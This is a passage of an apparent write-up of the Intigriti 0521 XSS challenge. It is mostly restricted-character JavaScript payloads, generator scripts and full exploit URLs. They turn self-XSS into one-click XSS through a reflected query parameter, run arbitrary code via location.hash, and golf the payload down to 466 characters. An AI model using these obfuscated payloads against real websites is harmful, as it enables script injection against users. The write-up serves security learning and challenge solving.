'`$&#123;e&#125;`[18]', t: '`$&#123;``+&#123;&#125;&#125;`[6]', u: '`$&#123;``[0]&#125;`[0]', \".\": '`.`' &#125; function getString(str) &#123; return str.split('').map(c => mapping[c] || 'error:' + c).join('+') &#125; const cons = getString('constructor') mapping['('] = '`$&#123;[][' + cons + ']&#125;`[14]' mapping[')'] = '`$&#123;[][' + cons + ']&#125;`[15]' const ans = \"[][\" + getString('constructor') + \"][\"+ getString('constructor') + \"]`_$&#123;\" + getString('alert(document.domain)') + \"&#125;```\" console.log(ans) output (length 851): [][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]`_$&#123;`$&#123;0/0&#125;`[1]+`$&#123;e&#125;`[21]+`e`+`$&#123;e&#125;`[13]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[14]+`$&#123;``[0]&#125;`[2]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``[0]&#125;`[0]+`$&#123;e&#125;`[23]+`e`+`$&#123;``[0]&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[6]+`.`+`$&#123;``[0]&#125;`[2]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[23]+`$&#123;0/0&#125;`[1]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[15]&#125;`` ` Paste the following string into the input field on the webpage and click submit, and you will see an alert pop up! After doing this, I was happy to submit my answer, but I received a response saying that this was self-XSS and suggesting that I study PHP more. I had forgotten that this was self-XSS, because the user needs to paste this malicious code into the input field themselves, which is similar to the user having to paste the malicious code themselves. This type of vulnerability usually cannot be severe. Therefore, I looked into PHP and found that the contents of c=xxx are directly reflected in c.value. So all you have to do is put the above string into the URL, like this: https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;e&#96;%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[14]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[2]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;.&#96;%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[2]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[15]&#125;&#96;&#96;+&#96; This way, the payload will be automatically filled in when the user clicks the link, and all they have to do is click a button to trigger it. So we turned self-XSS into one-click XSS, where clicking a button triggers the attack. At this point, we have actually passed this challenge, but because there is still time, I want to study more. Executing Arbitrary CodeExecuting fixed code is not very fun. Is it possible to execute arbitrary code? For example: window.name iframe + top.name location.hash The first two require creating another webpage, but the third does not, so let’s focus on that! We need to create the following string: []['constructor']['constructor']`_$&#123;'eval(location.hash.slice(1))'&#125;`` ` So as long as the URL ends with #alert(document.domain), the same effect can be achieved. The only two characters missing from the new character set are v and h. These two are actually not easy to find, because the easier ones have already been found. So where else can we find them? First, for v, you can actually turn the native function into a string and get the string [native code]. But the output is different on Chrome and Firefox. For example, for RegExp: Chrome output: function RegExp() &#123; [native code] &#125;Firefox output: function RegExp() &#123;\\n [native code]\\n&#125; Firefox adds line breaks while Chrome doesn’t, causing differences in character index. Therefore, it’s impossible to get the letter “v” across browsers. However, let’s first look at how to get the letter “h”. It’s also not easy to get the letter “h”, but if we can construct: 17[&#39;toString&#39;]`36`, we can actually get “h”. Because the above code converts the number 17 to base 36, we can get “h” because “h” is the 8th letter of the alphabet (9 digits + 8th letter of the alphabet &#x3D; 17). So how do we get the uppercase letter “S”? We can use the String constructor: ``['constructor'] + '' // output // \"function String() &#123; [native code] &#125;\" And once we can use this toString technique, we can actually get any lowercase letter of the alphabet, including the “v” mentioned earlier. I won’t demonstrate the detailed process, just modify the code and the final result is (1925 characters): [][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]`_$&#123;`e`+31[`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[9]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[15]]`36`+`$&#123;0/0&#125;`[1]+`$&#123;e&#125;`[21]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[14]+`$&#123;e&#125;`[21]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;0/0&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``[0]&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`.`+17[`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[9]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[15]]`36`+`$&#123;0/0&#125;`[1]+`$&#123;e&#125;`[18]+17[`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[9]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[15]]`36`+`.`+`$&#123;e&#125;`[18]+`$&#123;e&#125;`[21]+`$&#123;``[0]&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[5]+`e`+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[14]+1+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[15]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[15]&#125;`` `` The URL is: https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;e&#96;%2b31[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[9]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[15]]&#96;36&#96;%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[14]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;.&#96;%2b17[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[9]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[15]]&#96;36&#96;%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b17[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[9]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[15]]&#96;36&#96;%2b&#96;.&#96;%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;e&#96;%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[14]%2b1%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[15]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[15]&#125;&#96;&#96;+&#96;#alert(document.domain) Challenge for the Shortest CodeAfter being able to execute any code, what else can we do? That’s to challenge for the shortest code! Try to make the code as short as possible. Here are some tips: Instead of using ` ` `[0]` to get undefined, use e[0] to save one character. +&#123;&#125; to get [object Object] is unnecessary. Use &#123;&#125; instead to save three characters. Use e as much as possible because it makes the code shorter. We originally used [][&#39;constructor&#39;] to get the function, but it’s too long. We can use a more scientific way to find the shortest: let min = 99 let winner = '' for (let prop of Object.getOwnPropertyNames(Array.prototype)) &#123; const len = getString(prop).length if (len &lt; min) &#123; min = len winner = prop &#125; &#125; console.log(winner, min) The winner is some, which can replace the original [][&#39;constructor&#39;]. Finally, since we don’t need to execute any code, use alert(document.domain) instead. Although eval(name) seems shorter at first glance, it’s actually more difficult to get v, so it will cost more characters. The resulting code is 466 characters long: length: 466 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[13]+&#96;$&#123;e[0]&#125;&#96;[0]+&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[21]+&#96;e&#96;+&#96;$&#123;e&#125;&#96;[13]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[13]+&#96;$&#123;e[0]&#125;&#96;[2]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e[0]&#125;&#96;[0]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;e&#125;&#96;[6]+&#96;.&#96;+&#96;$&#123;e[0]&#125;&#96;[2]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e[0]&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96; &#96; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 